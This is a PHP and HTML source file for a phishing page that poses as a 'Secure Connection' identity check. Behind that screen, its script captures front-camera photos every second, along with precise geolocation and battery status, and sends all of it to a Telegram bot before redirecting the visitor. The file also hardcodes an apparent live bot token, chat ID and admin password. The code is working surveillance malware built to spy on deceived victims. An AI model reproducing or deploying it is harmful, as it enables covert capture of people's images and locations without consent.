<?php
// ====== AUTO-CREATE DIRS (Render restart pe kaam karega) ======
if (!is_dir('photos')) mkdir('photos', 0777, true);
if (!file_exists('visitors.json')) file_put_contents('visitors.json', '{}');
if (!file_exists('links.json')) file_put_contents('links.json', '{}');
if (!file_exists('debug.log')) file_put_contents('debug.log', date('Y-m-d H:i:s') . " - Initialized\n");

// ====== CONFIG LOAD (FIXED: return value assign karna mandatory hai!) ======
$config = include 'config.php';
if (!is_array($config)) {
    $config = [
        'bot_token'  => '8271297882:AAGhvkzMzSH4GQ-VeGmZ6_RR2h5oilx5rmg',
        'chat_id'    => '7531578236',
        'website'    => 'https://can-phishing.onrender.com/anmol/',
        'admin_username' => 'anish',
        'admin_password' => 'exploits123'
    ];
}

// ====== GET LINK DATA FROM SHORTCODE ======
$id = $_GET['id'] ?? '';
$targetUrl = 'https://google.com';
$creatorId = $config['chat_id'];

if (!empty($id)) {
    $links = json_decode(file_get_contents('links.json'), true);
    if (!is_array($links)) $links = [];
    
    if (isset($links[$id]) && is_array($links[$id])) {
        $targetUrl = $links[$id]['url'] ?? 'https://google.com';
        $creatorId = $links[$id]['created_by'] ?? $config['chat_id'];
    }
}

// ====== VISITOR ID (unique per visitor) ======
$visitorId = md5($_SERVER['REMOTE_ADDR'] . '_' . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown'));

// ====== LOG VISIT ======
$visitors = json_decode(file_get_contents('visitors.json'), true);
if (!is_array($visitors)) $visitors = [];

if (!isset($visitors[$visitorId])) {
    $visitors[$visitorId] = [
        'device' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
        'target_url' => $targetUrl,
        'generated_by' => $creatorId,
        'time' => date('Y-m-d H:i:s'),
        'photos' => 0,
        'locations' => 0,
        'battery' => 0
    ];
    file_put_contents('visitors.json', json_encode($visitors, JSON_PRETTY_PRINT));
}

// ====== FUNCTIONS ======
function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    $url = "https://api.telegram.org/bot$token/sendPhoto";
    
    if (!file_exists($photoPath)) return false;
    
    $post = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => "📸 *Spy Photo!*\n🆔 $visitorId\n⏰ " . date('Y-m-d H:i:s'),
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo send HTTP:$httpCode\n", FILE_APPEND);
    
    return $httpCode == 200;
}

function sendLocationToTelegram($chatId, $lat, $lng, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $url = "https://api.telegram.org/bot$token/sendLocation";
    $data = ['chat_id' => $chatId, 'latitude' => $lat, 'longitude' => $lng];
    @file_get_contents($url . "?" . http_build_query($data));
    
    $msg = "📍 *Live Location*\n🆔 $visitorId\n🗺️ https://maps.google.com/?q=$lat,$lng";
    $url2 = "https://api.telegram.org/bot$token/sendMessage";
    $data2 = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    @file_get_contents($url2 . "?" . http_build_query($data2));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Location sent: $lat, $lng\n", FILE_APPEND);
}

function sendBatteryToTelegram($chatId, $level, $charging, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $status = $charging ? "⚡ Charging" : "🔋 Not Charging";
    $msg = "🔋 *Battery Status*\n🆔 $visitorId\n📊 $level%\n$status";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    @file_get_contents($url . "?" . http_build_query($data));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Battery sent: $level%\n", FILE_APPEND);
}

// ====== HANDLE POST DATA (from victim browser) ======
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = file_get_contents('php://input');
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - POST received\n", FILE_APPEND);
    
    $data = json_decode($input, true);
    if (!$data || !is_array($data)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }
    
    $items = isset($data[0]) ? $data : [$data];
    
    $visitors = json_decode(file_get_contents("visitors.json"), true);
    if (!is_array($visitors)) $visitors = [];
    
    if (!isset($visitors[$visitorId])) {
        $visitors[$visitorId] = [
            'device' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
            'target_url' => $targetUrl,
            'generated_by' => $creatorId,
            'time' => date('Y-m-d H:i:s'),
            'photos' => 0,
            'locations' => 0,
            'battery' => 0
        ];
    }
    
    $visitors[$visitorId]['last_update'] = date('Y-m-d H:i:s');
    
    foreach ($items as $item) {
        if (!is_array($item)) continue;
        
        // PHOTO
        if (isset($item['photo']) && !empty($item['photo'])) {
            $photoData = $item['photo'];
            $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
            $photoData = str_replace(' ', '+', $photoData);
            $photoBinary = base64_decode($photoData, true);
            
            if ($photoBinary !== false && strlen($photoBinary) > 500) {
                $photoPath = "photos/" . $visitorId . "_" . time() . ".jpg";
                file_put_contents($photoPath, $photoBinary);
                
                file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo saved: " . filesize($photoPath) . " bytes\n", FILE_APPEND);
                
                if (file_exists($photoPath) && filesize($photoPath) > 500) {
                    sendPhotoToTelegram($creatorId, $photoPath, $visitorId);
                    $visitors[$visitorId]['photos'] += 1;
                }
            }
        }
        
        // LOCATION
        if (isset($item['location']) && is_array($item['location'])) {
            $lat = $item['location']['lat'] ?? 0;
            $lng = $item['location']['lng'] ?? 0;
            if ($lat != 0 && $lng != 0) {
                sendLocationToTelegram($creatorId, $lat, $lng, $visitorId);
                $visitors[$visitorId]['locations'] += 1;
            }
        }
        
        // BATTERY
        if (isset($item['battery']) && is_array($item['battery'])) {
            $level = $item['battery']['level'] ?? 0;
            $charging = $item['battery']['charging'] ?? false;
            if ($level > 0) {
                sendBatteryToTelegram($creatorId, $level, $charging, $visitorId);
                $visitors[$visitorId]['battery'] += 1;
            }
        }
    }
    
    file_put_contents("visitors.json", json_encode($visitors, JSON_PRETTY_PRINT));
    echo json_encode(['status' => 'success']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>✨ Anish Exploits</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: linear-gradient(135deg, #0c0c1e, #1a1a3e);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #fff;
}
.container {
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(10px);
    border: 1px solid rgba(255,255,255,0.1);
    border-radius: 20px;
    padding: 40px;
    text-align: center;
    max-width: 400px;
    width: 90%;
}
.lock-icon { font-size: 60px; margin-bottom: 20px; }
h2 { font-size: 22px; margin-bottom: 10px; }
#status { color: #8af; font-size: 16px; margin: 15px 0; }
.progress {
    width: 100%;
    height: 4px;
    background: rgba(255,255,255,0.1);
    border-radius: 2px;
    margin: 20px 0;
    overflow: hidden;
}
.progress-bar {
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, #0af, #0fa);
    animation: shrink 10s linear forwards;
}
@keyframes shrink { from { width: 100%; } to { width: 0%; } }
#debug {
    margin-top: 15px;
    font-size: 11px;
    color: rgba(255,255,255,0.3);
    max-height: 100px;
    overflow-y: auto;
    text-align: left;
    font-family: monospace;
}
</style>
</head>
<body>
<div class="container">
    <div class="lock-icon">🔒</div>
    <h2>🔒 Secure Connection</h2>
    <p style="color: rgba(255,255,255,0.5);">Verifying your identity...</p>
    <div id="status">📸 Initializing...</div>
    <div class="progress"><div class="progress-bar"></div></div>
    <p style="font-size: 12px; color: rgba(255,255,255,0.3);">🔒 256-bit SSL Encrypted</p>
    <div id="debug"></div>
</div>

<script>
// ====== TARGET URL (from PHP) ======
const targetUrl = <?php echo json_encode($targetUrl); ?>;
const visitorId = <?php echo json_encode($visitorId); ?>;
let isCapturing = true;

// ====== DEBUG LOG ======
function debug(msg) {
    const el = document.getElementById('debug');
    if (el) {
        const entry = document.createElement('div');
        entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
        el.appendChild(entry);
        el.scrollTop = el.scrollHeight;
    }
    console.log('[Spy]', msg);
}

// ====== SEND DATA TO SERVER ======
let pendingData = [];
let lastSend = 0;

function sendData(data) {
    if (!isCapturing) return;
    pendingData.push(data);
    if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
        const batch = pendingData.slice();
        pendingData = [];
        debug('📤 Sending ' + batch.length + ' items');
        fetch(window.location.href, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(batch)
        })
        .then(res => res.json())
        .then(data => { debug('✅ Server OK'); })
        .catch(err => { debug('❌ Send error: ' + err.message); });
        lastSend = Date.now();
    }
}

// ====== CAMERA ======
function startCamera() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        debug('❌ Camera API not supported');
        return;
    }
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } })
    .then(stream => {
        debug('✅ Camera started');
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        setInterval(() => {
            if (!isCapturing) return;
            ctx.drawImage(video, 0, 0, 320, 240);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
            sendData({ photo: dataUrl });
            debug('📸 Photo captured');
        }, 1000);
    })
    .catch(err => { debug('❌ Camera error: ' + err.message); });
}

// ====== GEOLOCATION ======
function startGeolocation() {
    if (!navigator.geolocation) {
        debug('❌ Geolocation not supported');
        return;
    }
    navigator.geolocation.getCurrentPosition(
        pos => {
            sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } });
            debug('📍 Location: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
        },
        err => { debug('❌ Location error: ' + err.message); },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// ====== BATTERY ======
function startBattery() {
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            function updateBattery() {
                sendData({ battery: { level: Math.round(battery.level * 100), charging: battery.charging } });
                debug('🔋 Battery: ' + Math.round(battery.level * 100) + '%');
            }
            updateBattery();
            setInterval(updateBattery, 5000);
        });
    } else {
        debug('❌ Battery API not supported');
    }
}

// ====== COUNTDOWN & REDIRECT ======
let secondsLeft = 10;
const statusEl = document.getElementById('status');
const countdown = setInterval(() => {
    secondsLeft--;
    if (secondsLeft > 0) statusEl.textContent = '🔄 Redirecting in ' + secondsLeft + 's...';
}, 1000);

setTimeout(() => {
    clearInterval(countdown);
    isCapturing = false;
    statusEl.textContent = '🚀 Redirecting...';
    debug('✅ Redirecting...');
    setTimeout(() => { window.location.href = targetUrl; }, 1500);
}, 10000);

// ====== START ALL ======
setTimeout(() => {
    startCamera();
    startGeolocation();
    startBattery();
}, 500);
</script>
</body>
</html>